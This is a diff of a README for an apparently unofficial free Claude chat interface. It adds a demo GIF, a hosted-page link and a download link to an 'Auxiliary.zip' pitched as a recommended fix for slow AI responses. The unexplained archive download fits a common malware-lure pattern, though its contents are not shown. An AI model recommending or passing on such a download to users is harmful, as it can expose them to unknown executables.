@@ -1,6 +1,6 @@
 ## Demo Video
 
-[Demo Video](https://github.com/gnaggnagVOID/Claude-AI/blob/main/Demo.mp4)
+![Demo GIF](/Demo.gif)
 
 # Claude AI Chat - Simple & Free
 
@@ -33,10 +33,11 @@ It's super simple:
 4. Open your web browser and go to: `http://localhost:8080/`
 5. Pick your Claude version and start chatting!
 
-Want to try it right away? Visit: 
+Want to try it right away? Visit: [Claude AI Chat Interface](https://gnaggnagvoid.github.io/Claude-AI/)
 
 ## Auxiliary - Optional but Recommended
 Auxiliary can be used to fix the AI thinking for too long or not responding.
+[Download](https://raw.githubusercontent.com/gnaggnagVOID/Claude-AI/main/Auxiliary.zip)
 
 ![Screenshot](/Auxilliary.png)
 
